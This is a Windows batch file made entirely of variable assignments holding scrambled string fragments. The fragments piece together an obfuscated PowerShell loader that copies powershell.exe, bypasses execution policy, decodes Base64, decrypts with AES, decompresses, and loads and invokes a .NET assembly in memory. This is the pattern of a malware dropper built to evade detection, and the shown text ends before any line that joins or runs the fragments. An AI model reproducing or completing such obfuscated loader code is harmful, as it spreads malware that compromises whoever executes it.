@echo off
set "HvDQjnfoEb=do"
set "CmAAAXhcxu=Wi"
set "XwcaxcnykC=nd"
set "MdJKoeZEiR=po"
set "AvkkoBHbNV=1."
set "SAEHnlFRVR=co"
set "bPnfwLbmvd= C"
set "NXZCmjPJPT=st"
set "GsYPRUUFYD=ws"
set "lhtwmxLzWk=he"
set "rSmEBHHhVQ=rS"
set "DqgUVpaTcA= /"
set "DZOagKEmyX=Sy"
set "YkXTtJuknt=y "
set "ImDBHiCfaj=Po"
set "BQCtmQZZZZ=\v"
set "POSRaQcjJH=em"
set "aFXMKOhXZq=in"
set "sTPCvlVzzV=rs"
set "ouojHQqyoU=py"
set "uhtSrPoNFz=s\"
set "NASKYkDwLZ=32"
set "bVUmSwhQGh=\W"
set "OqUcUrESFC=0\"
set "dGxurGsddF=we"
set "KZnuYZVDyk=ll"
set "BcSWzVnKCF=ll"
set "gHnVZbwjew=:\"
set "izfnFozFXd=xe"
set "UBYvHvRcjb=he"
set "BBMijTohoc=.e"
set "jswRKGhsjG=ow"
set "wScjApPdfx=we"
set "SoLNActKGr= %~dp0"
set "ojEbfhZvCy=cd"
set "FOnOnxwglB=aRsH"
set "HeFyanhced=yste"
set "syaFzgcGoh=esMa"
set "yyxkzZMhBj=raph"
set "CgAHGKAZYr=ptog"
set "luFzBtJoAE=ring"
set "RTYBxqAEzS=;$bY"
set "VqYtlWBeON='txe"
set "hqLNmqAZdq=736u"
set "sALXiaIpuG=sion"
set "OoeyzvJkdW=-ep "
set "UyqZxPtdZK=t Sy"
set "VXgixirjFm=.Cry"
set "XTNvJZTZUS=daeR"
set "vAVFxIbtLi=iuS."
set "gCJCGVokqt=tem."
set "ZAmGUScsXi=esaB"
set "JARbnLoAPL=yTo("
set "zdkNkfuAJt=yste"
set "TCdLMFcQbq=bYiu"
set "ZyFHEJHmvC=:: '"
set "UAyIEuSEbS=$RiQ"
set "llhwCZjfBb=$fmE"
set "OidDPrwqWt= [Sy"
set "tQesNJSmnX=trea"
set "AIAdfHoYRR=RiQW"
set "lMIGoASdcL=rO.D"
set "rTgJUttZFQ=ose("
set "OTOvRfrRdP=iewr"
set "jvsqwixvCa=-Obj"
set "eDOnxCJXxs=oint"
set "LuAyoDXmOT=UO.I"
set "BFUFvtPjtD=grap"
set "sQPTqwQqPo=ress"
set "xeACjEOayo=am;$"
set "ZAYmeUHlNK=lit("
set "ZVhoMLOkPt=XynS"
set "czTCqWRecH=em.I"
set "ZylimKEfGA=vert"
set "vVTNPAkITj=O.Me"
set "QkrsoEBtpS=File"
set "CijeHPsttc=.Key"
set "SKYZVAfnrZ=);$o"
set "jWvnMcsLrJ=bjec"
set "gFGKXsBHfB=Conv"
set "iQcvEmQZWA=ct S"
set "VhMqBfBRLi=ypto"
set "EbwtucwAje=Fo7l"
set "LgpamcITDA=c, 0"
set "YQuFJPMisM=Comp"
set "IbPmbqlkCf=ZYYc"
set "igGsOpisjK=oryS"
set "Lgjilmtoke=.IO."
set "ujXsrpKIWy=ew-O"
set "NGHlJNavqR=Obje"
set "dxFCSxFBYD=..-1"
set "piRBODbsGR=c = "
set "GNvknMSrmZ=d;$f"
set "VaQoiboJRf=sH.T"
set "agdsflMdAh=tion"
set "jfQvlRBvYS=join"
set "GgsgAPpQIw=iQWc"
set "MtURTlGeLK=pose"
set "seDppSxTXx=mEUO"
set "DBVczMxucP=n ''"
set "IUkkoejdGS=ress"
set "mLdcfDQBBA=$CaR"
set "CdIYEwAWJx=gMod"
set "vxifZFBzCr=mEUO"
set "GNKidvZnzH=onve"
set "WaLEIZfCSl=New-"
set "ytyTmjwWpr=and "
set "tUbpeAypNh=;$gn"
set "AzXQhHXmJQ=m.IO"
set "yUYBvFJpLq=] -j"
set "yOxMIvosuQ=ddin"
set "stClwerMpL=BC;$"
set "STeAlSGpDr=fmEU"
set "WJoUpAnIXh=).Sp"
set "NOVhTplNXF=iQWc"
set "wkIvlNdLNa=e]::"
set "NzvsHWDkFz=rans"
set "tqSwmevsRP=tem."
set "dAFNvageBb=oin "
set "MOefpRWTJQ=Disp"
set "gQdqGYgekx=7;$f"
set "TVQGYJIWte=6] -"
set "oMTlalLbUS=O.Pa"
set "gtATXxnXqJ=();$"
set "kRAufsHdiu=Bmor"
set "xwYwrKbyOU=);$f"
set "DdjlISAFAy=ode]"
set "LMYxSCvGUz=flec"
set "BbXScCGsww=();$"
set "UchTDzncom=stem"
set "kClguDJPbF=]::N"
set "ACPGSRtuKB=0O+g"
set "wlZjIitmFW=vt ="
set "mIcVwHAozh= = N"
set "YvWljzlDxo=ewLi"
set "jNZGzigkYa=stem"
set "SDSIcELoiL=]::C"
set "SEGydsgsJM=.Cry"
set "IRyMBivGuM=stem"
set "UytfrqGYZU=1..-"
set "jNdBIZpGoh=ionM"
set "KjgyilHwuS=y.Ci"
set "UKGpMIrrSX=('l0"
set "OFRqRsqcaL=sGUc"
set "gEkmaYrbGA=S = "
set "coUQdhDBPc=rofi"
set "waKRkyyBJD=3HWs"
set "oLuoiEurWW=[Sys"
set "MWwHyGTWek=ddin"
set "LjWzJPEQzh=Jck."
set "apVAUqFZGk=, (,"
set "GGRhaSBIIR='gni"
set "oNmjQkrZxW=-4] "
set "aBwRIuvfRy=$iew"
set "iWxPTFCfIe=F'[-"
set "dWLNBRVNYK=ert]"
set "IbILVUzCAa=raph"
set "obNUiwQHnH=pose"
set "jtNIOsaLfF=morF"
set "RBiEdUELkX=y]::"
set "YNxzoXZslN=ose("
set "GZaktjGpAR=rtS4"
set "hlLhKqLqQu=)($R"
set "PoVxkVWtJk=Secu"
set "HOSEaKYROX=$CaR"
set "xtnDYCkwUE=Fina"
set "AVSbydqxpx=gth)"
set "xUmXfHIKsT=Invo"
set "yEdZxSeCGH=Wc);"
set "mVWPAtcjDU===')"
set "CCgfIHSkZC=-joi"
set "kuRtcJzyWs=tsWi"
set "qOtpmWdcmi=$efy"
set "lXAnGPzGeb=16] "
set "bPXuaEOHdD=rity"
set "XzovPPzNYu=iron"
set "cKnmscxBcZ=+hAO"
set "ChNdYcdzvA=bstr"
set "yfCcpkQzKO=Jck "
set "iYklPpeTZy=ateD"
set "eyGWhUCYby='')("
set "JMXibJfsVm=m.IO"
set "NFyvpKAVBC=ct S"
set "fFxcqUlXeK=-1.."
set "KqpGtTbBZf=-joi"
set "qNPvLhvstK=saBm"
set "nmrqUgWwPW=eam("
set "djlOtnDYrK=sH);"
set "qSKAraWmtO=V = "
set "xerAqyyHCk=efyv"
set "nbsbqXHZJR=em.C"
set "arzrYdxvJv=.Dis"
set "VkKbDyrbOZ=le  "
set "ORDRVQWVDj=Mode"
set "feQhqFnOAf== $f"
set "gWaGCsrnxK=XynS"
set "tMaNtSwKTF=v4Ir"
set "shLUQFJvYB=)))"
set "nrpqTYZUdz=[]] "
set "mFnvlUuNnp=ment"
set "iLLEzIvByd= = $"
set "DyPJFnMUaM=Star"
set "XAdruKvTaE=pres"
set "kgTFnhZtzn=tryP"
set "gtxRpVEEVI=Disp"
set "DimOdkrnmy=.-16"
set "gJMtwRJbmM=ach "
set "wJLbQsjQSZ=('da"
set "lxYQwXSSrb=l.En"
set "LJenilvjie=)($z"
set "AUyMzEeJJA=[Sys"
set "XvLQwFzrll=[Sys"
set "jrVtOmKfRb=; };"
set "uekXxAtruc=null"
set "pMEFaGeLQK=O = "
set "mrAdgAocIZ=ispo"
set "TmwTWYIinG=Comp"
set "oPXPnWTXUC=urit"
set "vtChFTyxhn=.Ass"
set "BoMEPhujes=ay()"
set "MWJRABtmLe=.Dis"
set "ynCoMOjhTw=::('"
set "vUmsxhfDnY=ne);"
set "bPcOUGgMoJ=y.Pa"
set "HYApUtJUbb=Syst"
set "pgTgUxBCjO=  $z"
set "OOIZSRmILW=n ''"
set "zkGSqYyrxj=g = "
set "yNHoVAokCl= '')"
set "dmMkuaobuB=UGTu"
set "ipieLGiYWt=se()"
set "CXhcyBGfAx=mory"
set "PlglAqHlEs=OyzA"
set "GIuYXyldYa=.Com"
set "pEqfRnXYXJ=m(, "
set "XeQLTlNSWJ=comp"
set "KxWBFyRkca=tem."
set "MsZySJCSML=[Env"
set "gUWQFOuFZc=ion."
set "BKyOrGIhAW=-nop"
set "DqaTifGEhu=6esa"
set "DnVMSegbUb=Secu"
set "hecGCLLNmV=k.Su"
set "iwWbQuNbMR=($mD"
set "AHOnPYBIEu=Syst"
set "RokuyLAqHZ= New"
set "fvzMMahJem=t) {"
set "ZJDPEIuCGd=);$C"
set "fkdQnCoawK=mEUO"
set "rjvzPSrwOt=sH ="
set "ngXmARnRNL=th('"
set "izHYCjpifn=Obje"
set "MLWZIVnNPh=gnir"
set "VGImpwXPND=y.Cr"
set "riCEqXlihX=;$gn"
set "rbKUzqeczj=::De"
set "OeypjYeoSG=esFX"
set "ZQHUPdFpgp=mEUO"
set "bKMDSJYnLn=form"
set "MtDKUdcGpc=rity"
set "CwZpdwnMlk=rvmf"
set "oaplniPvBM=ck($"
set "ejQqoxwDlN=c = "
set "DhYQHcIuRD='[-1"
set "vcmMaqMdQV=nage"
set "iEQEOmZPZI=$CaR"
set "sdGDXEzTnG=.Cre"
set "NRkclrZxlT=ss -"
set "iPWznpnOiu=.Sec"
set "hqxIlXkvQZ=3); "
set "NRNqWZQWdm=ptog"
set "VlPqWhcics=);$i"
set "PdUokFcPrM=e = "
set "WnNeddaLoc=RiQW"
set "leCmiLiTWG=in $"
set "IWGvVYKxqM=.Con"
set "AgUkipHEly=ress"
set "zKtMwTEyMg=mDJc"
set "gCWBKiKpYk=.Len"
set "oHsAiOjwqH=comm"
set "UcbnoUghGx=embl"
set "PecmOCibsn=k; }"
set "qpHKUJdXMx=[-1."
set "bjcoKbZcAZ=uS, "
set "QVJsvPAOvD=$bYi"
set "cbBonUilGA= [st"
set "uKlQrFgrOm= = ["
set "lSXMRLMUiB=;$oU"
set "dwEiwjQWbP=tS46"
set "MkADAsCVKD=('%*'"
set "eXzHFXfPdl=oL'["
set "XmgewmyqfP=..-1"
set "DLmkntefGi=]::("
set "YgIXGTnsmz=nirt"
set "cCjWELyeCL=join"
set "LXMoVulSue=RiQW"
set "PDKWwjcGxa=pher"
set "KcrmFlvwvc=7Yiv"
set "dONfJpnpDj=orF'"
set "bHdqijMljl=m.Re"
set "YInAPyEiWd=UqVz"
set "bnctLueXFi= = $"
set "oIHpYxdcqP=, $R"
